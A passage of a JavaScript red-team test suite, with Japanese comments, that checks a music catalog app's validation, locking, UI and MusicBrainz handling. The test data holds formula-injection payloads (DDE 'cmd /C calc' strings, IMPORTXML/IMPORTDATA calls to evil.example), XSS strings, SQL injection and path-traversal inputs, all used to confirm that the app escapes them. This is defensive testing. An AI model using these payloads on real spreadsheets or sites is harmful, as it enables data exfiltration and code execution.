  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 1, trackName: '   ' }] }, desc: 'tracks[0].trackName: 空白のみ' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 1, trackName: 'T'.repeat(256) }] }, desc: 'tracks[0].trackName: 256文字 (制限超過)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 1, trackName: 'T', trackArtist: 'A'.repeat(256) }] }, desc: 'tracks[0].trackArtist: 256文字 (制限超過)' },

  // tracks 内 cdNumber の異常値・極限値 (小数は拒絶)
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1.5, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 小数 (1.5)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 0.1, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 小数 (0.1)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 2.9999, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 小数 (2.9999)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 0, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 0' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: -1, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 負数 (-1)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: -99999, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 巨大負数 (-99999)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: NaN, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: NaN' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 'NaN', trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 文字列 "NaN"' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 'abc', trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: 英字 "abc"' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: Infinity, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: Infinity' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: -Infinity, trackNumber: 1, trackName: 'T' }] }, desc: 'tracks[0].cdNumber: -Infinity' },

  // tracks 内 trackNumber の異常値・極限値 (小数は拒絶)
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 1.5, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: 小数 (1.5)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 0.5, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: 小数 (0.5)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 0, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: 0' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: -1, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: 負数 (-1)' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: NaN, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: NaN' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: 'abc', trackName: 'T' }] }, desc: 'tracks[0].trackNumber: 英字 "abc"' },
  { payload: { ...baseValidEditPayload(), tracks: [{ cdNumber: 1, trackNumber: Infinity, trackName: 'T' }] }, desc: 'tracks[0].trackNumber: Infinity' },

  // 同一CD番号内でのトラック番号重複攻撃
  {
    payload: {
      ...baseValidEditPayload(),
      tracks: [
        { cdNumber: 1, trackNumber: 1, trackName: 'Track 1' },
        { cdNumber: 1, trackNumber: 1, trackName: 'Track 1 Duplicate' }
      ]
    },
    desc: '同一CD内でのトラック番号重複 (Disc 1: #1, #1)'
  },
  {
    payload: {
      ...baseValidEditPayload(),
      tracks: [
        { cdNumber: 1, trackNumber: 1, trackName: 'Track 1' },
        { cdNumber: 1, trackNumber: 2, trackName: 'Track 2' },
        { cdNumber: 1, trackNumber: 1, trackName: 'Track 1 Duplicate Again' }
      ]
    },
    desc: '同一CD内でのトラック番号飛び重複 (Disc 1: #1, #2, #1)'
  }
];

invalidEditPayloads.forEach((tc) => {
  try {
    editMusicService.updateAlbum(tc.payload);
    recordResult(`updateAlbum(${tc.desc})`, false, `異常入力が例外なく受け入れられてしまった`, 'HIGH');
  } catch (err) {
    if (err.code === 'VALIDATION_FAILED') {
      recordResult(`updateAlbum(${tc.desc})`, true);
    } else {
      recordResult(`updateAlbum(${tc.desc})`, false, `予期せぬエラーコードまたは例外: ${err.message} (code: ${err.code})`, 'MEDIUM');
    }
  }
});

// 5.1.2 正常系境界値の検証 (255文字ちょうど、異なるCD番号間での同一トラック番号)
console.log('\n>>> [5.1.2] MusicService.updateAlbum 正常系境界値検証');

try {
  // 255文字境界値
  const exact255Payload = {
    targetKey: { originalAlbumArtist: 'Artist', originalAlbumName: 'Album' },
    album: {
      albumArtist: 'A'.repeat(255),
      albumName: 'B'.repeat(255)
    },
    tracks: [
      { cdNumber: 1, trackNumber: 1, trackName: 'T'.repeat(255), trackArtist: 'C'.repeat(255) }
    ]
  };
  editMusicService.updateAlbum(exact255Payload);
  recordResult('updateAlbum(255文字境界値が正常に許可される)', true);
} catch (err) {
  recordResult('updateAlbum(255文字境界値が正常に許可される)', false, `255文字で予期せぬ例外: ${err.message}`, 'HIGH');
}

try {
  // 異なるCD番号間での同一トラック番号（Disc 1 の #1 と Disc 2 の #1）は正当
  const multiDiscValidPayload = {
    targetKey: { originalAlbumArtist: 'Artist', originalAlbumName: 'Album' },
    album: { albumArtist: 'Artist', albumName: 'Album' },
    tracks: [
      { cdNumber: 1, trackNumber: 1, trackName: 'Disc 1 Track 1' },
      { cdNumber: 2, trackNumber: 1, trackName: 'Disc 2 Track 1' }
    ]
  };
  editMusicService.updateAlbum(multiDiscValidPayload);
  recordResult('updateAlbum(マルチディスクでの同一トラック番号許容: Disc 1 #1 & Disc 2 #1)', true);
} catch (err) {
  recordResult('updateAlbum(マルチディスクでの同一トラック番号許容: Disc 1 #1 & Disc 2 #1)', false, `予期せぬ例外: ${err.message}`, 'HIGH');
}


// -----------------------------------------------------------------------------
// 5.2 SheetService.updateAlbumBatch アトミック更新・式インジェクション・排他制御検証
// -----------------------------------------------------------------------------
console.log('\n>>> [5.2] SheetService.updateAlbumBatch アトミック置換・式インジェクション・排他制御検証');

let redTeamLockReleased = false;
let redTeamLockAcquired = true;

global.LockService = {
  getScriptLock: () => ({
    tryLock: (timeout) => redTeamLockAcquired,
    releaseLock: () => { redTeamLockReleased = true; }
  })
};

let redTeamSheetRows = [
  ['CD番号', 'アルバムアーティスト名', 'アルバム名', 'アーティスト名', 'トラック番号', 'トラック名', 'リリース日', 'アルバムアートURL'],
  [1, 'Original Artist', 'Target Album', 'Original Artist', 1, 'Track A', '2020-01-01', ''],
  [1, 'Original Artist', 'Target Album', 'Original Artist', 2, 'Track B', '2020-01-01', ''],
  [1, 'Another Artist', 'Another Album', 'Another Artist', 1, 'Untouched Track', '2021-01-01', '']
];

let redTeamCleared = false;
let redTeamWrittenValues = null;

const redTeamMockSheet = {
  getLastRow: () => redTeamSheetRows.length,
  getRange: (row, col, numRows, numCols) => ({
    getValues: () => redTeamSheetRows.slice(row - 1, row - 1 + numRows).map(r => r.slice(col - 1, col - 1 + numCols)),
    setValues: (values) => {
      redTeamWrittenValues = values;
      // 仮想更新
      redTeamSheetRows = [redTeamSheetRows[0]].concat(values);
    },
    clearContent: () => { redTeamCleared = true; }
  })
};

global.SpreadsheetApp = {
  openById: () => ({
    getSheetByName: () => redTeamMockSheet,
    insertSheet: () => redTeamMockSheet
  }),
  flush: () => {}
};

const realSheetService = new SheetService(mockConfig);

// 5.2.1 式インジェクション全記号無害化検証 (=, @, +, -)
redTeamLockReleased = false;
redTeamCleared = false;
redTeamWrittenValues = null;

const formulaAttackResult = realSheetService.updateAlbumBatch(
  { originalAlbumArtist: 'Original Artist', originalAlbumName: 'Target Album' },
  {
    albumArtist: '=SUM(1,2)',
    albumName: '@DDE("cmd";"/C calc";"A0")',
    releaseDate: '+2026-10-17',
    artworkUrl: '-https://example.com/evil.jpg'
  },
  [
    { cdNumber: 1, trackNumber: 1, trackName: '=1+1', trackArtist: '+Artist' },
    { cdNumber: 1, trackNumber: 2, trackName: '@IMPORTXML("x","y")', trackArtist: '-Evil' }
  ]
);

recordResult('SheetService: 排他ロックが確実に releaseLock された', redTeamLockReleased === true);
recordResult('SheetService: 更新前に clearContent() による旧行消去が実行された', redTeamCleared === true);
recordResult('SheetService: 更新新トラック数 2件', formulaAttackResult.updatedRowCount === 2);
recordResult('SheetService: 旧トラック削除数 2件', formulaAttackResult.previousRowCount === 2);
recordResult('SheetService: 全行数 3件 (非対象行1件 + 新トラック2件)', formulaAttackResult.totalRowCount === 3);

// 全項目に対する式エスケープの確認
let allFormulasEscaped = true;
if (redTeamWrittenValues) {
  // 非対象行 (Another Artist)
  const untouched = redTeamWrittenValues.find(r => r[1] === 'Another Artist');
  if (!untouched) {
    allFormulasEscaped = false;
    recordResult('SheetService: 非対象アルバムのデータが保持されているか', false, '非対象アルバム行が誤って消去された', 'HIGH');
  } else {
    recordResult('SheetService: 非対象アルバムのデータが保持されているか', true);
  }

  // 新行群の式エスケープ検査
  const newRow1 = redTeamWrittenValues.find(r => r[4] === 1 && r[1].includes('SUM'));
  if (newRow1) {
    if (!newRow1[1].startsWith("'=")) allFormulasEscaped = false; // albumArtist
    if (!newRow1[2].startsWith("'@")) allFormulasEscaped = false; // albumName
    if (!newRow1[3].startsWith("'+")) allFormulasEscaped = false; // trackArtist
    if (!newRow1[5].startsWith("'=")) allFormulasEscaped = false; // trackName
    if (!newRow1[6].startsWith("'+")) allFormulasEscaped = false; // releaseDate
    if (!newRow1[7].startsWith("'-")) allFormulasEscaped = false; // artworkUrl
  } else {
    allFormulasEscaped = false;
  }
} else {
  allFormulasEscaped = false;
}
recordResult('SheetService: 式インジェクション全記号 (=, @, +, -) が先頭シングルクォートで無害化された', allFormulasEscaped, '式インジェクション記号が先頭に残存している', 'CRITICAL');

// 5.2.2 排他ロック競合タイムアウト検証 (tryLock -> false)
redTeamLockAcquired = false;
try {
  realSheetService.updateAlbumBatch(
    { originalAlbumArtist: 'Another Artist', originalAlbumName: 'Another Album' },
    { albumArtist: 'New', albumName: 'New' },
    [{ cdNumber: 1, trackNumber: 1, trackName: 'T' }]
  );
  recordResult('SheetService: ロック取得失敗時に例外送出', false, 'ロック未取得なのに処理が続行された', 'HIGH');
} catch (err) {
  if (err.code === 'LOCK_TIMEOUT') {
    recordResult('SheetService: ロック取得失敗時に LOCK_TIMEOUT 例外送出', true);
  } else {
    recordResult('SheetService: ロック取得失敗時に LOCK_TIMEOUT 例外送出', false, `コード不一致: ${err.code}`, 'MEDIUM');
  }
}
redTeamLockAcquired = true;

// 5.2.3 存在しないアルバムの更新要求で NOT_FOUND 検証
try {
  realSheetService.updateAlbumBatch(
    { originalAlbumArtist: 'Ghost Artist', originalAlbumName: 'Ghost Album' },
    { albumArtist: 'New', albumName: 'New' },
    [{ cdNumber: 1, trackNumber: 1, trackName: 'T' }]
  );
  recordResult('SheetService: 存在しないアルバム更新時に NOT_FOUND 例外送出', false, '例外なく処理された', 'HIGH');
} catch (err) {
  if (err.code === 'NOT_FOUND') {
    recordResult('SheetService: 存在しないアルバム更新時に NOT_FOUND 例外送出', true);
  } else {
    recordResult('SheetService: 存在しないアルバム更新時に NOT_FOUND 例外送出', false, `コード不一致: ${err.code}`, 'MEDIUM');
  }
}


// -----------------------------------------------------------------------------
// 5.3 フロントエンド UI / 二重送信抑止 & WCAG タッチターゲット検証
// -----------------------------------------------------------------------------
console.log('\n>>> [5.3] フロントエンド UI / 二重送信抑止 & WCAG タッチターゲット検証');

const editAlbumModalContent = fs.readFileSync(path.join(__dirname, '../src/EditAlbumModal.html'), 'utf8');

// 5.3.1 EditAlbumModal.html の Enter 送信抑止 (onsubmit="event.preventDefault();")
const hasEditFormPreventDefault = editAlbumModalContent.includes('form-edit-album') &&
                                  editAlbumModalContent.includes('onsubmit="event.preventDefault();"');
recordResult('EditAlbumModal: Enterキー誤送信／不正リロード抑止 (onsubmit="event.preventDefault();")', hasEditFormPreventDefault, 'form に onsubmit="event.preventDefault();" が未設定', 'HIGH');

// 5.3.2 EditAlbumModal.html の各種ボタン WCAG 44px ターゲット確保
const editButtonsHas44px = [
  { id: 'btn-close-edit-album', desc: '閉じるボタン (btn-close-edit-album)' },
  { id: 'btn-mobile-submit-edit-album', desc: 'スマホ用保存ボタン (btn-mobile-submit-edit-album)' },
  { id: 'btn-renumber-edit-tracks', desc: '自動連番採番ボタン (btn-renumber-edit-tracks)' },
  { id: 'btn-add-edit-track', desc: 'トラック追加ボタン (btn-add-edit-track)' },
  { id: 'btn-cancel-edit-album', desc: 'キャンセルボタン (btn-cancel-edit-album)' },
  { id: 'btn-submit-edit-album', desc: 'PC用保存ボタン (btn-submit-edit-album)' }
];

editButtonsHas44px.forEach((btn) => {
  const has44px = editAlbumModalContent.includes(btn.id) && editAlbumModalContent.includes('min-h-[44px]');
  recordResult(`EditAlbumModal: ${btn.desc} 44pxタッチターゲット確保`, has44px, 'min-h-[44px] が指定されていない', 'MEDIUM');
});

// 5.3.3 TrackDetail.html の「このアルバムを編集」ボタン 44px ターゲット確保
const editBtnInTrackDetailHas44px = trackDetailContent.includes('btn-edit-album') &&
                                    trackDetailContent.includes('min-h-[44px]') &&
                                    trackDetailContent.includes('min-w-[44px]');
recordResult('TrackDetail: このアルバムを編集ボタン (btn-edit-album) 44pxタッチターゲット確保', editBtnInTrackDetailHas44px, 'min-h-[44px] min-w-[44px] が指定されていない', 'MEDIUM');

// 5.3.4 ScriptsApp.html 内の動的削除ボタンの 44px 確保
const removeTrackBtnHas44px = appContent.includes('btn-remove-edit-track') &&
                              appContent.includes('min-h-[44px]');
recordResult('ScriptsApp: 動的生成トラック削除ボタン (btn-remove-edit-track) 44px確保', removeTrackBtnHas44px, 'min-h-[44px] が指定されていない', 'MEDIUM');

// 5.3.5 CD番号・トラック番号入力欄の inputmode="numeric" 指定
const hasInputModeNumeric = editAlbumModalContent.includes('inputmode="numeric"') ||
                            appContent.includes('inputmode="numeric"');
recordResult('EditAlbumModal / ScriptsApp: 数値入力欄への inputmode="numeric" 指定', hasInputModeNumeric, '仮想テンキー指定 inputmode="numeric" が欠落', 'LOW');

// 5.3.6 ScriptsApp.html の二重送信防止（フラグガード ＋ 物理無効化 ＋ スピナー制御）
const hasEditIsSavingGuard = appContent.includes('handleSaveAlbumEdit') &&
                             appContent.includes('if (this.store.state.isSaving) return;') &&
                             appContent.includes('this.store.state.isSaving = true;');
recordResult('ScriptsApp.handleSaveAlbumEdit: isSaving フラグによる二重実行ガード', hasEditIsSavingGuard, 'isSaving ガードが未実装', 'HIGH');

const hasEditPhysicalDisable = appContent.includes('btnSubmit.disabled = true') &&
                               appContent.includes('btnMobileSubmit.disabled = true');
recordResult('ScriptsApp.handleSaveAlbumEdit: 保存ボタンの物理無効化 (PC/スマホ両対応)', hasEditPhysicalDisable, '送信中にボタンが disabled にされない', 'HIGH');

const hasEditSpinnerControl = appContent.includes('spinners.forEach') &&
                              appContent.includes('edit-album-submit-spinner');
recordResult('ScriptsApp.handleSaveAlbumEdit: スピナーアニメーション表示制御', hasEditSpinnerControl, 'スピナー制御が未実装', 'LOW');

// 5.3.7 ScriptsApp.html の異常系例外ハンドリング（エラー時に入力内容を保持）
const keepsModalOpenOnError = appContent.includes('handleSaveAlbumEdit') &&
                              appContent.includes('アルバム更新エラー') &&
                              !appContent.substring(appContent.indexOf('catch (err) {'), appContent.indexOf('finally {')).includes('this.closeEditAlbumModal()');
recordResult('ScriptsApp.handleSaveAlbumEdit: エラー発生時に入力内容を保持（モーダルを閉じない）', keepsModalOpenOnError, 'catch 句でモーダルを閉じてしまい入力内容が破棄される', 'HIGH');


// -----------------------------------------------------------------------------
// 5.4 Store.updateAlbumInCatalog キャッシュ差分同期 & 追従検証
// -----------------------------------------------------------------------------
console.log('\n>>> [5.4] Store.updateAlbumInCatalog キャッシュ差分同期 & 追従検証');

const editStore = new Store();
editStore.setTracks([
  { cdNumber: 1, albumArtist: 'Old Artist', albumName: 'Old Album', trackArtist: 'Old Artist', trackNumber: 1, trackName: 'Old Song 1' },
  { cdNumber: 1, albumArtist: 'Old Artist', albumName: 'Old Album', trackArtist: 'Old Artist', trackNumber: 2, trackName: 'Old Song 2' },
  { cdNumber: 1, albumArtist: 'Stay Artist', albumName: 'Stay Album', trackArtist: 'Stay Artist', trackNumber: 1, trackName: 'Stay Song' }
]);
editStore.state.selectedArtist = 'Old Artist';
editStore.state.selectedAlbum = 'Old Album';

// アルバム改名・アーティスト改名・曲数変更（2曲 -> 3曲）
editStore.updateAlbumInCatalog(
  { originalAlbumArtist: 'Old Artist', originalAlbumName: 'Old Album' },
  { albumArtist: 'New Artist', albumName: 'New Album', releaseDate: '2026-10-17', artworkUrl: 'https://example.com/new.jpg' },
  [
    { cdNumber: 1, trackNumber: 1, trackName: 'New Song 1', trackArtist: 'New Artist' },
    { cdNumber: 1, trackNumber: 2, trackName: 'New Song 2', trackArtist: 'New Artist' },
    { cdNumber: 2, trackNumber: 1, trackName: 'New Disc 2 Song 1', trackArtist: 'New Artist' }
  ]
);

recordResult('Store: 改名後の selectedArtist が自動追従', editStore.state.selectedArtist === 'New Artist');
recordResult('Store: 改名後の selectedAlbum が自動追従', editStore.state.selectedAlbum === 'New Album');

const oldArtistInCatalog = editStore.state.musicCatalog['Old Artist'];
recordResult('Store: 旧アーティスト・旧アルバムがカタログから消去されているか', !oldArtistInCatalog || !oldArtistInCatalog.albums['Old Album']);

const newAlbumInCatalog = editStore.state.musicCatalog['New Artist']?.albums['New Album'];
recordResult('Store: 新アルバムがカタログに登録されているか', !!newAlbumInCatalog);
recordResult('Store: 新アルバムの総トラック数が 3曲 であるか', newAlbumInCatalog?.totalTracks === 3);

const stayAlbumInCatalog = editStore.state.musicCatalog['Stay Artist']?.albums['Stay Album'];
recordResult('Store: 他のアルバムデータが破損せず維持されているか', !!stayAlbumInCatalog && stayAlbumInCatalog.totalTracks === 1);


// -----------------------------------------------------------------------------
// [TEST SUITE 6] MusicBrainz 統合検索・Lookup レッドチーム破壊的テスト
// -----------------------------------------------------------------------------
console.log('\n>>> [6] MusicBrainz 統合検索・Lookup レッドチーム破壊的テスト');

const MusicBrainzService = require('../src/MusicBrainzService');

// 6.1 MBID インジェクション・パストラバーサル攻撃耐性
console.log('\n>>> [6.1] MBID インジェクション・パストラバーサル攻撃耐性');
let mbHttpCalledOnInvalid = false;
global.UrlFetchApp = {
  fetch: () => {
    mbHttpCalledOnInvalid = true;
    throw new Error('Should not execute HTTP request on invalid MBID');
  }
};
const rtMbConfig = {
  isMusicBrainzEnabled: () => true,
  getMusicBrainzUserAgent: () => 'MusicInfoApp/1.1.0 (https://example.com)'
};
const rtMbService = new MusicBrainzService(rtMbConfig);
const rtMusicServiceWithMb = new MusicService(mockConfig, mockSheetService, mockDriveService, mockItunesService, rtMbService);

const maliciousMbids = [
  '../../admin',
  'f5093c06-23e3-404f-aeaa-40f72885ee3a?inc=aliases+annotation',
  'f5093c06-23e3-404f-aeaa-40f72885ee3a#fragment',
  '12345',
  '',
  null,
  undefined,
  "'; DROP TABLE releases; --",
  'f5093c06-23e3-404f-aeaa-40f72885ee3g' // non-hex 'g'
];

let allMaliciousMbidsBlocked = true;
for (const badMbid of maliciousMbids) {
  let blocked = false;
  try {
    rtMusicServiceWithMb.lookupMusicBrainzRelease(badMbid);
  } catch (e) {
    blocked = e.message.includes('MBID');
  }
  if (!blocked) {
    allMaliciousMbidsBlocked = false;
  }
}
recordResult('MBID 検証: 全ての不正・パストラバーサル・パラメータ汚染 MBID を事前遮断', allMaliciousMbidsBlocked, '一部の不正 MBID が通過した', 'CRITICAL');
recordResult('MBID 検証: 不正 MBID 時に外部 HTTP 通信が一切発生しない', !mbHttpCalledOnInvalid, '不正 MBID で UrlFetchApp.fetch が呼ばれた', 'CRITICAL');

// 6.2 Lucene クエリ構文インジェクション耐性
console.log('\n>>> [6.2] Lucene クエリ構文インジェクション耐性');
const lucenePayloads = [
  'test AND *:*',
  'artist:"evil"~10',
  '[1 TO 999999]',
  '{a TO z}',
  '(foo OR bar)^999',
  '\\+\\-\\!\\(\\)\\{\\}\\[\\]\\^\\"\\~\\*\\?\\:\\/\\\\'
];
let luceneSanitizedOk = true;
for (const payload of lucenePayloads) {
  const sanitized = rtMbService.sanitizeSearchQuery(payload);
  // エスケープされていない単独の * や ? や [ ] が残っていないか確認
  if (/(?<!\\)[\+\-\!\(\)\{\}\[\]\^\"\~\*\?\:\/]/.test(sanitized)) {
    luceneSanitizedOk = false;
  }
}
recordResult('Lucene サニタイズ: 全ての構文メタ文字がバックスラッシュで無害化される', luceneSanitizedOk, '未エスケープのメタ文字が残存', 'HIGH');

// 6.3 悪意ある MusicBrainz JSON ペイロード（XSS / 数式インジェクション / 空オブジェクト欠損）
console.log('\n>>> [6.3] 悪意ある MusicBrainz JSON レスポンス & スプレッドシート数式インジェクション防御');
const maliciousMbSearchJson = JSON.stringify({
  releases: [
    {}, // 完全空オブジェクト
    {
      id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
      title: '=IMPORTXML("http://evil.example/leak","//a")',
      score: 100,
      country: '<script>alert(1)</script>',
      date: '2025-05',
      disambiguation: '"><img src=x onerror=alert(1)>',
      'artist-credit': [
        { name: '+SUM(1,1)', joinphrase: ' & ' },
        { artist: { name: '<svg onload=alert(2)>' } }
      ],
      'label-info': [
        {},
        { label: { name: '-cmd|\'/C calc\'!A0' } }
      ],
      media: [
        {},
        { format: '<iframe src="javascript:alert(3)">', 'track-count': 2 }
      ]
    }
  ]
});

let parsedMaliciousSearch = null;
let maliciousSearchNoCrash = false;
try {
  parsedMaliciousSearch = rtMbService.parseSearchResponse({
    getResponseCode: () => 200,
    getContentText: () => maliciousMbSearchJson
  });
  maliciousSearchNoCrash = Array.isArray(parsedMaliciousSearch) && parsedMaliciousSearch.length === 1;
} catch (e) {
  maliciousSearchNoCrash = false;
}
recordResult('MB 異常 JSON パース: 空オブジェクト混在・悪意ある文字列でもクラッシュせず有効分のみ抽出', maliciousSearchNoCrash, 'parseSearchResponse が例外をスローしたか不正 ID を通した', 'HIGH');

// Lookup レスポンスの欠損・数式インジェクション耐性からの saveAlbumBatch 連携検証
global.UrlFetchApp = {
  fetch: () => ({
    getResponseCode: () => 200,
    getAllHeaders: () => ({}),
    getContentText: () => JSON.stringify({
      id: 'a1b2c3d4-e5f6-7890-abcd-ef1234567890',
      title: '=IMPORTDATA("http://evil.example/csv")',
      date: '2025',
      'artist-credit': [{ name: '@SUM(A1:A10)' }],
      media: [
        {}, // tracks 欠損
        {
          position: 1,
          format: 'CD<script>',
          tracks: [
            {}, // 空トラック (position 1 にフォールバック)
            {
              position: 2,
              title: '=HYPERLINK("http://evil.example","Click")',
              'artist-credit': [{ name: '-1+1' }]
            }
          ]
        }
      ]
    })
  })
};

let lookupAndSaveSafe = false;
try {
  const lookupRes = rtMusicServiceWithMb.lookupMusicBrainzRelease('a1b2c3d4-e5f6-7890-abcd-ef1234567890');
  const detail = lookupRes.albumDetail;
  // SheetService の実際のセル変換ロジックを通す
  let writtenRows = null;
  const mockSheetForMb = {
    getLastRow: () => 1,
    getRange: (r, c, numR, numC) => ({
      setNumberFormat: () => {},
      setValues: (rows) => { writtenRows = rows; }
    })
  };
  const realSheetServiceForMb = new SheetService({ getSheetName: () => 'Tracks' });
  realSheetServiceForMb.getOrCreateSheet = () => mockSheetForMb;
  realSheetServiceForMb.insertTracksBatch(
    detail.tracks,
    {
      albumArtist: detail.albumArtist,
      albumName: detail.albumName,
      releaseDate: detail.releaseDate
    },
    'https://coverartarchive.org/release/a1b2c3d4-e5f6-7890-abcd-ef1234567890/front-500'
  );
  // 2行目 (tracks[1]: 悪意ある数式入りトラック) の全テキスト列 (=, +, -, @ 始まり) の先頭にシングルクォートが付与されているか検証
  const rowMalicious = writtenRows[1];
  lookupAndSaveSafe =
    Array.isArray(writtenRows) &&
    writtenRows.length === 2 &&
    rowMalicious[1].startsWith("'@") && // albumArtist: '@SUM(A1:A10)'
    rowMalicious[2].startsWith("'=") && // albumName: '=IMPORTDATA(...)'
    rowMalicious[3].startsWith("'-") && // trackArtist: '-1+1'
    rowMalicious[5].startsWith("'=") && // trackName: '=HYPERLINK(...)'
    rowMalicious[6] === '2025';         // 部分日付 YYYY がそのまま保持される
} catch (e) {
  lookupAndSaveSafe = false;
}
recordResult('MB Lookup -> SheetService 保存: 数式インジェクション文字列が無害化され部分日付が保持される', lookupAndSaveSafe, '数式インジェクション防御または部分日付保持に失敗', 'CRITICAL');

// 6.4 フロントエンド XSS 防止検証（インライン onerror 排除・MB メタ情報の escapeHtml）
console.log('\n>>> [6.4] フロントエンド XSS 防止検証 (renderItunesResults)');
const hasNoInlineOnerror = !appContent.includes('onerror="');
recordResult('ScriptsApp: インライン onerror 属性が存在しない（プログラマティック image.onerror バインド）', hasNoInlineOnerror, 'インライン onerror 属性が残存している', 'HIGH');

const escapesMbMeta =
  appContent.includes('Utils.escapeHtml(String(item.extra.format))') &&
  appContent.includes('Utils.escapeHtml(String(item.extra.country))') &&
  appContent.includes('Utils.escapeHtml(String(item.extra.label))') &&
  appContent.includes('Utils.escapeHtml(String(item.extra.disambiguation))');
recordResult('ScriptsApp: MusicBrainz 固有メタ情報 (format/country/label/disambiguation) が全て escapeHtml されている', escapesMbMeta, '未エスケープの MB メタ情報出力が存在する', 'HIGH');


// -----------------------------------------------------------------------------
// 結果サマリー
// -----------------------------------------------------------------------------
console.log('\n================================================================');
console.log(`RED TEAM 検証結果: 全 ${totalTests} 件中 成功 = ${passedTests}, 指摘/失敗 = ${failedTests}`);
console.log('================================================================');

if (findings.length > 0) {
  console.log('\n【検出された指摘・脆弱性一覧】');
  findings.forEach((f, idx) => {
    console.log(`${idx + 1}. [${f.severity}] ${f.testName}: ${f.detail}`);
  });
}

})();


